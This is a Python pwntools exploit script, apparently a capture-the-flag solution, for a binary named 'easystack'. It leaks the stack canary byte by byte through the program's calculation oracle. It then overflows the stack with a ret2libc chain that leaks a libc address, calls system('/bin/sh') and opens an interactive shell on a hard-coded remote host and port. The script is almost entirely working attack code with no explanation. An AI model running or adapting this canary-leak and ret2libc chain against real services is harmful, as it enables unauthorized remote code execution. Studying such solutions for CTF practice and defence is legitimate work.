#-*- encoding: utf-8 -*- 
from pwn import *
context.binary = './easystack'
#context.log_level = 'debug'
context.timeout = None
elf = context.binary
def dbg():
	raw_input()

def calc(size, pay):
	p.sendlineafter('calc: ', str(size))
	for i in range(300):
		p.sendlineafter('stop): ', str(pay[i]))

	p.recvuntil('answer is ')
	leak = int(p.recvline().strip('\n'), 10)

	p.sendlineafter('Do you want to exit?(y or n)\n', 'y')
	return leak

def pwn(payload):
	size = len(payload)/4
	p.sendlineafter('calc: ', str(size))
	for i in range(size):
		p.sendlineafter('stop): ', str(u32(payload[4*i:4*i+4])))
	p.sendlineafter('Do you want to exit?(y or n)\n', 'y')
def exploit():
	fun_cout = 0x08048750
	std_cout = 0x0804A0C0
	libc_start_main_got = 0x08049FE8
	vuln = 0x080488E7

	payload = p32(1)*300
	payload += p32(canary)
	payload += p32(1)*3
	payload += p32(fun_cout)
	payload += p32(vuln)
	payload += p32(std_cout)
	payload += p32(libc_start_main_got)
	pwn(payload)

	libc_start_main_addr = u32(p.recv(4))
	
	libc.address = libc_start_main_addr - libc.symbols['__libc_start_main']
	system = libc.symbols['system']
	binsh = next(libc.search('/bin/sh\x00'))
	
	'''	
	obj = LibcSearcher("__libc_start_main", libc_start_main_addr)
	base = libc_start_main_addr - obj.dump('__libc_start_main')

	system = obj.dump('system') + base
	binsh = obj.dump('str_bin_sh') + base
	'''
	print "system ==> " + hex(system)
	payload = p32(1)*300
	payload += p32(canary)
	payload += p32(1)*3
	payload += p32(system)
	payload += p32(vuln)
	payload += p32(binsh)

	pwn(payload)

	
	p.interactive()


if __name__ == '__main__':

	#p = process('./easystack')
	#libc = elf.libc
	p = remote('101.71.29.5', 10036)
	libc = ELF('./x86_libc.so.6')

	cmp = [0x1] * 300
	for i in range(2, 0x100+1):
		cmp[i+300-0x101] = (i << 24)
	cmp[299] = 0

	'''
	print cmp
	cnt = 0
	for i in range(300):
		tmp0 = cmp[i]
		for j in range(i+1, 300):
			if cmp[i] > cmp[j]:
				cnt += 1

	print cnt
	'''
	#gdb.attach(p, 'b* 0x08048AB7')
	dbg()
	high = 0xff - (calc(301, cmp) - 299)
	print 'high ==> ' + hex(high)

	cmp = [0x1]*300
	for i in range(2, 0x100+1):
		cmp[i+300-0x101] =  (high << 24) + (i << 16)
	cmp[299]=0
	mid = 0xff - (calc(301, cmp) - 299)
	print "mid ==> " + hex(mid)

	cmp = [0x1]*0x300
	for i in range(2, 0x100+1):
		cmp[i+300-0x101] =  (high << 24) + (mid << 16) + (i << 8)
	cmp[299]=0
	low = 0xff - (calc(301, cmp) - 299)
	print "low ==> " + hex(low)

	canary = (high << 24) + (mid << 16) + (low << 8)
	print "canary ==> " + hex(canary)

	exploit()